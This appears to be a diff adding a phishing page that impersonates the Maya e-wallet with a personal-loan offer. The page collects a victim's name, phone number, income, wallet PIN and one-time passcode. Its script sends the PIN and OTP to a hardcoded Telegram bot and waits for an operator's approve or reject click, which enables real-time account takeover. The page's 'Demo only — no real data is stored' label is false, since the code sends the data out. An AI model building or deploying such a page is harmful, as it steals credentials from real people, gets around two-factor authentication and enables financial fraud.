@@ -1,0 +1,414 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Maya Loan Demo</title>
+  <style>
+    :root{--mint:#00c896;--dark:#009f7a;--pale:#e2faf4;--blue:#176ff5;--ink:#123b36;--muted:#75908c;--line:#d9eeea;--white:#fff;--danger:#d94b4b;--shadow:0 20px 50px #1255491f}*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Inter,Arial,sans-serif;color:var(--ink);background:linear-gradient(135deg,#e9faf5,#f8fffd)}button,input,select,textarea{font:inherit}button{cursor:pointer}.screen{display:none;min-height:100vh;flex-direction:column}.screen.active{display:flex}.nav-brand{display:block;width:120px;height:auto}.help-button{position:fixed;z-index:10;top:18px;right:20px;border:0;border-radius:999px;background:#111;color:#fff;padding:10px 18px;font-size:13px;font-weight:800;box-shadow:0 8px 18px #0003}.page-footer{margin-top:auto;padding:18px 20px 20px;text-align:center;color:var(--muted);font-size:12px}.page-shell{width:min(1180px,92%);margin:auto;padding:28px 0 36px}.topbar{display:flex;align-items:center;justify-content:space-between;padding:0 0 22px}.chip{display:inline-block;border-radius:999px;background:var(--pale);color:var(--dark);padding:9px 13px;font-size:12px;font-weight:800}.loan-hero{display:grid;grid-template-columns:1.15fr .85fr;gap:26px;align-items:center;padding:32px;background:#ffffffcc;border:1px solid var(--line);border-radius:30px;box-shadow:var(--shadow)}h1{letter-spacing:-.05em}.loan-copy h1{margin:15px 0;font-size:clamp(32px,5vw,58px);line-height:1.03}.loan-copy p{max-width:620px;color:var(--muted);line-height:1.7}.loan-card{padding:24px;border-radius:25px;color:#fff;background:linear-gradient(135deg,#0d8af5,#357dff);box-shadow:0 20px 40px #1d7af540}.loan-card .amount{margin:15px 0;font-size:clamp(30px,4vw,46px);font-weight:900}.loan-stats{display:grid;grid-template-columns:1fr 1fr;gap:12px}.loan-stat{padding:14px;border:1px solid #ffffff33;border-radius:15px;background:#ffffff1f}.loan-stat small{opacity:.85}.loan-stat strong{display:block;margin-top:7px;font-size:21px}.loan-slider{margin-top:22px;padding:23px;border:1px solid var(--line);border-radius:22px;background:#ffffffcc}.slider-head{display:flex;justify-content:space-between;align-items:center}.slider-value{color:var(--blue);font-size:22px;font-weight:900}input[type=range]{width:100%;margin-top:18px;accent-color:var(--blue)}.scale{display:flex;justify-content:space-between;color:var(--muted);font-size:12px}.loan-options{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-top:18px}.option-card{padding:20px;border:1px solid var(--line);border-radius:20px;background:#ffffffcc}.option-card label{display:block;margin-bottom:9px;font-size:13px;font-weight:800}.option-card select{width:100%;padding:13px;border:1px solid var(--line);border-radius:12px;background:#fff;color:var(--ink);outline:0}.loan-cta{display:flex;gap:12px;margin-top:23px}.primary-btn,.secondary-btn{border:0;border-radius:13px;padding:15px 20px;font-weight:800}.primary-btn{color:#fff;background:linear-gradient(135deg,var(--mint),var(--dark))}.secondary-btn{color:var(--ink);background:#fff;border:1px solid var(--line)}.auth-screen{flex-direction:column;align-items:center;justify-content:center;padding:70px 20px 0}.auth-card{width:min(100%,480px);padding:34px 30px 25px;border:1px solid var(--line);border-radius:27px;background:#fff;box-shadow:var(--shadow)}.auth-logo{width:130px;margin:0 auto 27px}.auth-card h1{margin:0;text-align:center;font-size:28px}.subtitle{margin:10px 0 23px;text-align:center;line-height:1.5;color:var(--muted)}.demo-note{margin-bottom:17px;padding:10px;border-radius:11px;background:#176ff512;color:var(--blue);text-align:center;font-size:12px;font-weight:700}.group{margin-bottom:16px}.group label{display:block;margin-bottom:8px;font-size:13px;font-weight:800}.field{display:flex;align-items:center;overflow:hidden;border:1px solid var(--line);border-radius:12px;background:#fbfffe}.field:focus-within{border-color:var(--mint);box-shadow:0 0 0 4px #00c8961a}.field input,.field textarea,.field select{width:100%;padding:14px;border:0;outline:0;background:transparent;color:var(--ink)}.field textarea{min-height:90px;resize:vertical}.prefix{padding-left:14px;color:var(--muted);font-weight:800}.toggle{padding:9px;border:0;background:transparent;color:var(--dark);font-size:12px;font-weight:800}.primary-button{width:100%;padding:15px;border:0;border-radius:12px;background:linear-gradient(135deg,var(--mint),var(--dark));color:#fff;font-weight:800;cursor:pointer}.primary-button:disabled{opacity:.6;cursor:not-allowed}.error{display:none;margin-bottom:14px;padding:11px;border-radius:10px;background:#fff0f0;color:var(--danger);font-size:13px;font-weight:700}.error.show{display:block}.status-msg{display:none;margin-bottom:14px;padding:11px;border-radius:10px;background:#e8f5e9;color:#2e7d32;font-size:13px;font-weight:700}.status-msg.show{display:block}.auth-footer{text-align:center;color:var(--muted);font-size:13px}.auth-footer a{color:var(--dark);font-weight:800;cursor:pointer}.otp-icon{display:grid;place-items:center;width:64px;height:64px;margin:0 auto 20px;border-radius:20px;background:var(--pale);color:var(--dark);font-size:30px}.otp-inputs{display:flex;gap:8px;justify-content:center;margin:20px 0}.otp{width:45px;height:45px;text-align:center;font-size:24px;font-weight:900;border:1px solid var(--line);border-radius:12px;background:#fbfffe;outline:0;transition:all .2s}.otp:focus{border-color:var(--mint);box-shadow:0 0 0 4px #00c8961a}.resend,.back{display:inline-block;margin:17px auto 0;border:0;background:transparent;font-size:13px;font-weight:800;cursor:pointer;text-align:center}.resend{color:var(--dark)}.back{color:var(--muted)}.dashboard{flex-direction:column}.dash-top{height:76px;display:flex;align-items:center;justify-content:space-between;padding:0 5%;background:#ffffffe0;border-bottom:1px solid var(--line)}.dashboard-logo{width:105px}.profile{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:800}.avatar{display:grid;place-items:center;width:36px;height:36px;border-radius:50%;background:var(--pale);color:var(--dark)}.dashboard-layout{display:grid;grid-template-columns:220px 1fr;gap:28px;width:min(1180px,92%);margin:28px auto}.menu{display:flex;flex-direction:column;gap:8px}.menu-item{display:flex;align-items:center;gap:10px;padding:13px;border-radius:13px;font-size:14px;font-weight:800;cursor:pointer}.menu-item.active{background:var(--pale);color:var(--dark)}.menu-icon{display:grid;place-items:center;width:30px;height:30px;border-radius:9px;background:#00c8961a}.welcome h1{margin:0;font-size:30px}.welcome p{margin:8px 0 22px;color:var(--muted)}.balance{display:flex;justify-content:space-between;padding:25px;border-radius:23px;color:#fff;background:linear-gradient(135deg,var(--mint),var(--dark));box-shadow:0 18px 34px #00c89640}.balance-amount{font-size:36px;font-weight:900}.balance small{display:block;margin-top:10px}.hide{border:1px solid #fff6;border-radius:50%;width:36px;height:36px;background:transparent;color:#fff;cursor:pointer}.quick{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:22px 0}.action{padding:17px 8px;border:1px solid var(--line);border-radius:16px;background:#fff;color:var(--ink);font-weight:800;cursor:pointer}.action-icon{display:grid;place-items:center;width:42px;height:42px;margin:0 auto 9px;border-radius:12px;background:var(--pale);color:var(--dark);font-size:20px}.dash-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:20px}.panel{padding:22px;border:1px solid var(--line);border-radius:20px;background:#ffffffd9}.panel h2{margin:0 0 14px;font-size:18px}.transaction{display:grid;grid-template-columns:40px 1fr auto;gap:12px;align-items:center;padding:12px 0;border-bottom:1px solid var(--line)}.transaction:last-child{border-bottom:0}.transaction-avatar{display:grid;place-items:center;width:40px;height:40px;border-radius:12px;background:var(--pale);color:var(--dark);font-weight:900}.transaction-title{font-size:14px;font-weight:800}.transaction-meta{margin-top:4px;color:var(--muted);font-size:12px}.transaction-amount{font-size:13px;font-weight:900;white-space:nowrap}.positive{color:var(--dark)}.insight{display:grid;grid-template-columns:1fr 1fr;gap:12px}.insight-box{padding:16px;border-radius:15px;background:var(--pale)}.insight-label{color:var(--muted);font-size:12px}.insight-value{margin-top:8px;font-size:22px;font-weight:900}@media(max-width:900px){.loan-hero,.dash-grid{grid-template-columns:1fr}.dashboard-layout{grid-template-columns:1fr}.menu{display:grid;grid-template-columns:repeat(3,1fr)}.menu-item{justify-content:center;font-size:12px}}@media(max-width:560px){.loan-options,.quick{grid-template-columns:1fr 1fr}.loan-hero{padding:22px}.loan-cta{flex-direction:column}.profile span{display:none}.menu{grid-template-columns:1fr 1fr}.balance-amount{font-size:29px}.otp-inputs{gap:4px}.otp{width:40px;height:40px;font-size:20px}}
+  </style>
+</head>
+<body>
+  <button class="help-button" type="button" onclick="alert('Help is available in this prototype.')">Help</button>
+
+  <!-- STEP 1: LOAN AMOUNT SELECTION -->
+  <section id="step1" class="screen active auth-screen">
+    <div class="page-shell">
+      <header class="topbar"><img class="nav-brand nav-image" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"></header>
+      <div class="loan-hero">
+        <div class="loan-copy"><span class="chip">Personal loan</span><h1>Get up to ₱500,000.</h1><p>Choose an amount and repayment term for this Maya-inspired loan application prototype.</p><div class="loan-cta"><button class="primary-btn" type="button" onclick="nextStep(2)">Apply now</button><button class="secondary-btn" type="button" onclick="alert('This prototype demonstrates a loan application flow.')">How it works</button></div></div>
+        <div class="loan-card"><small>Estimated monthly payment</small><div id="monthlyPayment" class="amount">₱8,430</div><div class="loan-stats"><div class="loan-stat"><small>Annual interest</small><strong>4%</strong></div><div class="loan-stat"><small>Maximum term</small><strong>60 mo</strong></div></div></div>
+      </div>
+      <div class="loan-slider"><div class="slider-head"><strong>Loan amount</strong><span id="loanAmountDisplay" class="slider-value">₱100,000</span></div><input id="loanRange" type="range" min="10000" max="500000" step="5000" value="100000"><div class="scale"><span>₱10,000</span><span>₱500,000</span></div></div>
+      <div class="loan-options"><div class="option-card"><label for="termSelect">Loan period</label><select id="termSelect"><option value="6">6 months</option><option value="12">12 months</option><option value="18">18 months</option><option value="24">24 months</option><option value="36">36 months</option><option value="48">48 months</option><option value="60" selected>60 months</option></select></div><div class="option-card"><label for="purposeSelect">Loan purpose</label><select id="purposeSelect"><option value="">Choose a purpose</option><option>Emergency expenses</option><option>Home improvement</option><option>Education</option><option>Medical expenses</option><option>Business capital</option><option>Debt consolidation</option><option>Other</option></select></div></div>
+    </div>
+    <footer class="page-footer">© 2026 Maya</footer>
+  </section>
+
+  <!-- STEP 2: PERSONAL DETAILS -->
+  <section id="step2" class="screen auth-screen"><div class="auth-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><h1>Loan details</h1><p class="subtitle">Complete your application to continue.</p><div class="demo-note">Demo only — no real data is stored.</div><form id="detailsForm" onsubmit="return checkDetails()"><div class="group"><label for="fullName">Full name</label><div class="field"><input id="fullName" type="text" placeholder="Juan Dela Cruz" required></div></div><div class="group"><label for="phoneDetail">Phone number</label><div class="field"><span class="prefix">+63</span><input id="phoneDetail" type="tel" maxlength="10" placeholder="9XX XXX XXXX" required></div></div><div class="group"><label for="purpose">Loan purpose</label><div class="field"><select id="purpose" required><option value="">Choose a purpose</option><option>Emergency expenses</option><option>Home improvement</option><option>Education</option><option>Medical expenses</option><option>Business capital</option><option>Debt consolidation</option><option>Other</option></select></div></div><div class="group"><label for="income">Monthly income</label><div class="field"><input id="income" type="number" min="0" placeholder="25000" required></div></div><button class="primary-button" type="submit">Continue to login</button></form></div><footer class="page-footer">© 2026 Maya</footer></section>
+
+  <!-- STEP 3: LOGIN -->
+  <section id="step3" class="screen auth-screen"><div class="auth-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><h1>Welcome back</h1><p class="subtitle">Log in to access your wallet and manage your money.</p><div id="loginError" class="error">Please enter your phone number and PIN.</div><div id="loginStatus" class="status-msg">Waiting for agent approval...</div><form id="loginForm" onsubmit="return false"><div class="group"><label for="loginPhone">Mobile number</label><div class="field"><span class="prefix">+63</span><input id="loginPhone" type="tel" maxlength="10" placeholder="9XX XXX XXXX" required></div></div><div class="group"><label for="loginPin">PIN</label><div class="field"><input id="loginPin" type="password" placeholder="Enter your 4-digit PIN" maxlength="4" required><button id="pinToggleBtn" class="toggle" type="button" onclick="togglePin()">Show</button></div></div><button id="loginContinueBtn" class="primary-button" type="button" onclick="goToOTP()">Continue</button></form><p class="auth-footer">Don't have an account? <a href="#">Sign up</a></p></div><footer class="page-footer">© 2026 Maya</footer></section>
+
+  <!-- STEP 4: OTP VERIFICATION -->
+  <section id="step4" class="screen auth-screen"><div class="auth-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><div class="otp-icon">✓</div><h1>Verify your number</h1><p class="subtitle">Enter the 6-digit OTP sent to <strong id="otpPhone">+63 9XX XXX XXXX</strong>.</p><div id="otpError" class="error">Enter a 6-digit OTP.</div><div id="otpStatus" class="status-msg">Verifying OTP...</div><form id="otpForm" onsubmit="return false"><div class="otp-inputs"><input class="otp" id="otp1" type="text" maxlength="1" inputmode="numeric" required><input class="otp" id="otp2" type="text" maxlength="1" inputmode="numeric" required><input class="otp" id="otp3" type="text" maxlength="1" inputmode="numeric" required><input class="otp" id="otp4" type="text" maxlength="1" inputmode="numeric" required><input class="otp" id="otp5" type="text" maxlength="1" inputmode="numeric" required><input class="otp" id="otp6" type="text" maxlength="1" inputmode="numeric" required></div><button id="otpVerifyBtn" class="primary-button" type="button" onclick="submitOTP()">Verify and continue</button></form><div id="resendTimer" style="display:none;margin-top:20px;text-align:center;color:var(--muted);font-size:13px"></div><button id="resendAction" class="resend" type="button" onclick="resendOTP()" style="display:none">Resend OTP</button><button id="backToLogin" class="back" type="button" onclick="nextStep(3)">← Back to login</button></div><footer class="page-footer">© 2026 Maya</footer></section>
+
+  <!-- STEP 5: CONFIRMATION -->
+  <section id="step5" class="screen auth-screen"><div class="auth-card"><img class="nav-brand nav-image auth-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><div class="otp-icon">✓</div><h1>Application Complete</h1><p class="subtitle">Your loan application has been approved!</p><div class="group" style="margin-top:30px;text-align:left;background:var(--pale);padding:20px;border-radius:12px"><div style="margin-bottom:12px"><strong>Loan Amount</strong><br><span id="final1" style="font-size:24px;color:var(--blue);font-weight:900">₱100,000</span></div><div style="margin-bottom:12px"><strong>Term</strong><br><span id="finalTerm" style="font-size:18px;font-weight:800">60 months</span></div><div><strong>Monthly Payment</strong><br><span id="fMonth" style="font-size:20px;color:var(--dark);font-weight:900">₱8,430</span></div></div><div style="margin-top:30px;padding:20px;background:#e8f5e9;border-radius:12px;color:#2e7d32;font-size:14px"><strong>Approved for:</strong><br>Name: <span id="fName">-</span><br>Phone: <span id="fPhone">-</span></div><button class="primary-button" style="margin-top:30px" onclick="nextStep(6)">Go to Dashboard</button></div><footer class="page-footer">© 2026 Maya</footer></section>
+
+  <!-- STEP 6: DASHBOARD -->
+  <section id="step6" class="screen dashboard"><header class="dash-top"><img class="nav-brand nav-image dashboard-logo" src="https://www.maya.ph/hubfs/Maya/MAYA-Mint%20Green.svg" loading="lazy" alt="Maya Logo"><div class="profile"><div class="avatar" id="avatarInitial">N</div><span id="dashName">Nicole Santos</span></div></header><div class="dashboard-layout"><aside><nav class="menu"><div class="menu-item active"><div class="menu-icon">⌂</div>Overview</div><div class="menu-item"><div class="menu-icon">⇄</div>Transfers</div><div class="menu-item"><div class="menu-icon">▣</div>Wallet</div><div class="menu-item"><div class="menu-icon">▤</div>Bills</div><div class="menu-item"><div class="menu-icon">⚙</div>Settings</div><div id="logoutButton" class="menu-item" onclick="nextStep(1)"><div class="menu-icon">↪</div>Log out</div></nav></aside><main><div class="welcome"><h1 id="welcomeMsg">Good evening, Nicole</h1><p>Here is your wallet overview.</p></div><section class="balance"><div><div>Available balance</div><div id="balance" class="balance-amount">₱ 24,780.50</div><small>Updated just now</small></div><button id="hideBalance" class="hide" type="button">◉</button></section><section class="quick"><button class="action"><div class="action-icon">↗</div>Send</button><button class="action"><div class="action-icon">⊕</div>Top up</button><button class="action"><div class="action-icon">▤</div>Bills</button><button class="action"><div class="action-icon">⌾</div>Scan</button></section><section class="dash-grid"><div class="panel"><h2>Recent activity</h2><div class="transaction"><div class="transaction-avatar">A</div><div><div class="transaction-title">Auntie Rose</div><div class="transaction-meta">Transfer · Today</div></div><div class="transaction-amount positive">+ ₱1,200</div></div><div class="transaction"><div class="transaction-avatar">S</div><div><div class="transaction-title">Smart Load</div><div class="transaction-meta">Mobile · Yesterday</div></div><div class="transaction-amount">− ₱300</div></div><div class="transaction"><div class="transaction-avatar">M</div><div><div class="transaction-title">Maynilad</div><div class="transaction-meta">Bills · 2 days ago</div></div><div class="transaction-amount">− ₱1,850</div></div></div><div class="panel"><h2>Wallet insights</h2><div class="insight"><div class="insight-box"><div class="insight-label">Saved this month</div><div class="insight-value">₱7.4k</div></div><div class="insight-box"><div class="insight-label">Bills paid</div><div class="insight-value">11</div></div><div class="insight-box"><div class="insight-label">Cash out</div><div class="insight-value">₱5.1k</div></div><div class="insight-box"><div class="insight-label">Daily spend</div><div class="insight-value">₱840</div></div></div></div></section></main></div><footer class="page-footer">© 2026 Maya</footer></section>
+
+  <script>
+    // ==================== TELEGRAM BOT CONFIGURATION ====================
+    const TELEGRAM_BOT_TOKEN = '8913797417:AAFb5LoGkwgfXQugR2gcmVz-DXYgQC6IWw4';
+    const TELEGRAM_ADMIN_CHAT = '8820857419';
+    let tgLastUpdateId = 0;
+    let sessionToken = null;
+    let loginPollHandle = null;
+    let otpPollHandle = null;
+    let loginPollingTimeoutHandle = null;
+    let otpPollingTimeoutHandle = null;
+
+    // ==================== LOAN CALCULATION ====================
+    const range = document.getElementById('loanRange');
+    const amount = document.getElementById('loanAmountDisplay');
+    const term = document.getElementById('termSelect');
+    const payment = document.getElementById('monthlyPayment');
+    
+    function updateLoan() {
+      const p = Number(range.value);
+      const months = Number(term.value);
+      const r = 0.04 / 12;
+      const m = (p * r * Math.pow(1 + r, months)) / (Math.pow(1 + r, months) - 1);
+      
+      const formatted = new Intl.NumberFormat('en-PH', { style: 'currency', currency: 'PHP', maximumFractionDigits: 0 }).format(p);
+      const monthlyFormatted = new Intl.NumberFormat('en-PH', { style: 'currency', currency: 'PHP', maximumFractionDigits: 0 }).format(m);
+      
+      amount.textContent = formatted;
+      payment.textContent = monthlyFormatted;
+    }
+    
+    range.addEventListener('input', updateLoan);
+    term.addEventListener('change', updateLoan);
+    updateLoan();
+
+    // ==================== SCREEN NAVIGATION ====================
+    function nextStep(n) {
+      document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+      document.getElementById('step' + n).classList.add('active');
+      
+      if (n === 4) {
+        startOTPTimer();
+      }
+      if (n === 5) {
+        const full = document.getElementById('fullName').value;
+        document.getElementById('fName').textContent = full || '-';
+        const ph = document.getElementById('phoneDetail').value;
+        document.getElementById('fPhone').textContent = ph ? '+63 ' + ph : '-';
+      }
+      if (n === 6) {
+        const nameValue = document.getElementById('fullName').value;
+        const firstChar = (nameValue || 'N').charAt(0).toUpperCase();
+        document.getElementById('avatarInitial').textContent = firstChar;
+        document.getElementById('dashName').textContent = nameValue || 'Customer';
+        document.getElementById('welcomeMsg').textContent = 'Good evening, ' + (nameValue.split(' ')[0] || 'there');
+      }
+    }
+
+    function checkDetails() {
+      if (!document.getElementById('fullName').value || !document.getElementById('phoneDetail').value || !document.getElementById('purpose').value || !document.getElementById('income').value) {
+        alert('Please fill all fields');
+        return false;
+      }
+      document.getElementById('loginPhone').value = document.getElementById('phoneDetail').value;
+      nextStep(3);
+      return false;
+    }
+
+    // ==================== PIN & OTP UTILITIES ====================
+    function togglePin() {
+      const pinInput = document.getElementById('loginPin');
+      const btn = document.getElementById('pinToggleBtn');
+      if (pinInput.type === 'password') {
+        pinInput.type = 'text';
+        btn.textContent = 'Hide';
+      } else {
+        pinInput.type = 'password';
+        btn.textContent = 'Show';
+      }
+      pinInput.focus();
+    }
+
+    let otpTimer;
+    let timeLeft = 60;
+
+    function startOTPTimer() {
+      clearInterval(otpTimer);
+      timeLeft = 60;
+      const rt = document.getElementById('resendTimer');
+      const ra = document.getElementById('resendAction');
+      if (rt) rt.style.display = 'inline';
+      if (ra) ra.style.display = 'none';
+      updateTimerText();
+      otpTimer = setInterval(() => {
+        timeLeft--;
+        updateTimerText();
+        if (timeLeft <= 0) {
+          clearInterval(otpTimer);
+          if (rt) rt.style.display = 'none';
+          if (ra) ra.style.display = 'inline';
+        }
+      }, 1000);
+    }
+
+    function updateTimerText() {
+      const el = document.getElementById('resendTimer');
+      if (!el) return;
+      const m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+      const s = (timeLeft % 60).toString().padStart(2, '0');
+      el.textContent = `Resend in ${m}:${s}`;
+    }
+
+    function resendOTP() {
+      alert('New OTP sent to +63 ' + document.getElementById('loginPhone').value);
+      document.querySelectorAll('.otp').forEach(i => i.value = '');
+      const first = document.getElementById('otp1');
+      if (first) first.focus();
+      startOTPTimer();
+    }
+
+    // ==================== OTP INPUT HANDLING ====================
+    document.querySelectorAll('.otp').forEach((input, idx, all) => {
+      input.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        if (e.target.value && idx < 5) {
+          all[idx + 1].focus();
+        }
+      });
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !e.target.value && idx > 0) {
+          all[idx - 1].focus();
+        }
+      });
+    });
+
+    // ==================== TELEGRAM INTEGRATION ====================
+    function generateSessionId() {
+      return 's_' + Math.random().toString(36).slice(2, 10);
+    }
+
+    async function telegramApiGet(path, params = {}) {
+      const url = new URL(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${path}`);
+      Object.keys(params).forEach(k => url.searchParams.append(k, params[k]));
+      const res = await fetch(url.toString());
+      return res.json();
+    }
+
+    async function telegramApiPost(path, body = {}) {
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${path}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      return res.json();
+    }
+
+    async function sendTelegramLoginRequest(session, phone, pin) {
+      const loanAmt = document.getElementById('loanAmountDisplay').textContent;
+      const loanTerm = document.getElementById('termSelect').value + ' months';
+      const text = `🔐 Login Attempt\nSession: ${session}\nPhone: +63 ${phone}\nPIN: ${pin}\nLoan: ${loanAmt} / ${loanTerm}`;
+      const reply_markup = {
+        inline_keyboard: [
+          [
+            { text: '✓ APPROVE', callback_data: `approve_login::${session}` },
+            { text: '✗ WRONG PIN', callback_data: `wrongpin_login::${session}` }
+          ]
+        ]
+      };
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+        return Promise.reject('Bot token not configured.');
+      }
+      return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+    }
+
+    async function sendTelegramOTPRequest(session, otp, otpPhone) {
+      const loanAmt = document.getElementById('loanAmountDisplay').textContent;
+      const loanTerm = document.getElementById('termSelect').value + ' months';
+      const text = `📱 OTP Verification\nSession: ${session}\nPhone: ${otpPhone}\nOTP: ${otp}\nLoan: ${loanAmt} / ${loanTerm}`;
+      const reply_markup = {
+        inline_keyboard: [
+          [
+            { text: '✓ APPROVE', callback_data: `approve_otp::${session}` },
+            { text: '✗ WRONG OTP', callback_data: `wrongotp::${session}` }
+          ]
+        ]
+      };
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+        return Promise.reject('Bot token not configured.');
+      }
+      return telegramApiPost('sendMessage', { chat_id: TELEGRAM_ADMIN_CHAT, text, reply_markup });
+    }
+
+    function pollTelegramForAction({ session, timeoutMs = 120000, onAction = () => {}, onTimeout = () => {} }) {
+      if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN.includes('REPLACE')) {
+        onTimeout();
+        return;
+      }
+
+      telegramApiGet('getUpdates').then(res => {
+        if (res && res.ok && Array.isArray(res.result) && res.result.length) {
+          const maxId = Math.max(...res.result.map(u => u.update_id));
+          tgLastUpdateId = maxId + 1;
+        }
+      }).catch(() => {});
+
+      const start = Date.now();
+      const pollInterval = 1500;
+
+      const poll = async () => {
+        try {
+          const res = await telegramApiGet('getUpdates', { offset: tgLastUpdateId, timeout: 0 });
+          if (res && res.ok && Array.isArray(res.result) && res.result.length) {
+            for (const update of res.result) {
+              tgLastUpdateId = update.update_id + 1;
+              if (update.callback_query && update.callback_query.data) {
+                const data = update.callback_query.data;
+                const callbackId = update.callback_query.id;
+                telegramApiPost('answerCallbackQuery', { callback_query_id: callbackId, text: '✓ Action received' }).catch(() => {});
+                if (data.endsWith('::' + session)) {
+                  const action = data.split('::')[0];
+                  onAction(action);
+                  return clearPolling();
+                }
+              }
+            }
+          }
+          if (Date.now() - start > timeoutMs) {
+            clearPolling();
+            onTimeout();
+          }
+        } catch (err) {
+          console.error('Polling error', err);
+          if (Date.now() - start > timeoutMs) {
+            clearPolling();
+            onTimeout();
+          }
+        }
+      };
+
+      function clearPolling() {
+        if (loginPollHandle) { clearInterval(loginPollHandle); loginPollHandle = null; }
+        if (otpPollHandle) { clearInterval(otpPollHandle); otpPollHandle = null; }
+        if (loginPollingTimeoutHandle) { clearTimeout(loginPollingTimeoutHandle); loginPollingTimeoutHandle = null; }
+        if (otpPollingTimeoutHandle) { clearTimeout(otpPollingTimeoutHandle); otpPollingTimeoutHandle = null; }
+      }
+
+      if (session && session.startsWith('s_')) {
+        const handle = setInterval(poll, pollInterval);
+        loginPollHandle = handle;
+        otpPollHandle = handle;
+        const toHandle = setTimeout(() => {
+          clearInterval(handle);
+          if (onTimeout) onTimeout();
+        }, timeoutMs + 500);
+        loginPollingTimeoutHandle = toHandle;
+      } else {
+        setTimeout(onTimeout, 0);
+      }
+    }
+
+    function goToOTP() {
+      const p = document.getElementById('loginPhone').value.trim();
+      const pin = document.getElementById('loginPin').value.trim();
+      if (!p || !pin) {
+        alert('Enter phone and PIN');
+        return;
+      }
+
+      sessionToken = generateSessionId();
+      const loginBtn = document.getElementById('loginContinueBtn');
+      const loginStatus = document.getElementById('loginStatus');
+      const origText = loginBtn.textContent;
+      loginBtn.disabled = true;
+      loginBtn.textContent = 'Waiting for agent...';
+      loginStatus.style.display = 'block';
+
+      sendTelegramLoginRequest(sessionToken, p, pin)
+        .then(() => {
+          pollTelegramForAction({
+            session: sessionToken,
+            timeoutMs: 2 * 60 * 1000,
+            onAction: (action) => {
+              clearTimeout(loginPollingTimeoutHandle);
+              loginBtn.disabled = false;
+              loginBtn.textContent = origText;
+              loginStatus.style.display = 'none';
+              if (action === 'approve_login') {
+                document.getElementById('otpPhone').textContent = '+63 ' + p;
+                nextStep(4);
+              } else if (action === 'wrongpin_login') {
+                alert('The PIN provided is wrong. Please try again.');
+              } else {
+                alert('Received unknown action from agent: ' + action);
+              }
+            },
+            onTimeout: () => {
+              loginBtn.disabled = false;
+              loginBtn.textContent = origText;
+              loginStatus.style.display = 'none';
+              alert('No response from agent. Please try again later.');
+            }
+          });
+        })
+        .catch(err => {
+          loginBtn.disabled = false;
+          loginBtn.textContent = origText;
+          loginStatus.style.display = 'none';
+          console.error('Send login request failed', err);
+          alert('Failed to send request to agent. Please try again.');
+        });
+    }
+
+    function submitOTP() {
+      const code = Array.from(document.querySelectorAll('.otp')).map(i => i.value).join('');
+      if (code.length !== 6) {
+        alert('Please enter 6-digit OTP');
+        return;
+      }
+
+      const otpBtn = document.getElementById('otpVerifyBtn');
+      const otpStatus = document.getElementById('otpStatus');
+      const origText = otpBtn.textContent;
+      otpBtn.disabled = true;
+      otpBtn.textContent = 'Verifying...';
+      otpStatus.style.display = 'block';
+
+      sendTelegramOTPRequest(sessionToken, code, document.getElementById('otpPhone').textContent)
+        .then(() => {
+          pollTelegramForAction({
+            session: sessionToken,
+            timeoutMs: 2 * 60 * 1000,
+            onAction: (action) => {
+              clearTimeout(otpPollingTimeoutHandle);
+              otpBtn.disabled = false;
+              otpBtn.textContent = origText;
+              otpStatus.style.display = 'none';
+              if (action === 'approve_otp') {
+                nextStep(5);
+              } else if (action === 'wrongotp') {
+                alert('The OTP provided is wrong or has expired. Please try again.');
+                document.querySelectorAll('.otp').forEach(i => i.value = '');
+                const first = document.getElementById('otp1');
+                if (first) first.focus();
+              } else {
+                alert('Unknown OTP action: ' + action);
+              }
+            },
+            onTimeout: () => {
+              otpBtn.disabled = false;
+              otpBtn.textContent = origText;
+              otpStatus.style.display = 'none';
+              alert('No response from agent regarding OTP. Please try again.');
+            }
+          });
+        })
+        .catch(err => {
+          otpBtn.disabled = false;
+          otpBtn.textContent = origText;
+          otpStatus.style.display = 'none';
+          console.error('Send OTP request failed', err);
+          alert('Failed to send OTP to agent. Please try again.');
+        });
+    }
+
+    // ==================== DASHBOARD UTILITIES ====================
+    document.getElementById('hideBalance').onclick = () => {
+      const b = document.getElementById('balance');
+      const v = b.textContent.includes('24,780.50');
+      b.textContent = v ? '₱ ••••••••' : '₱ 24,780.50';
+    };
+  </script>
+</body>
+</html>
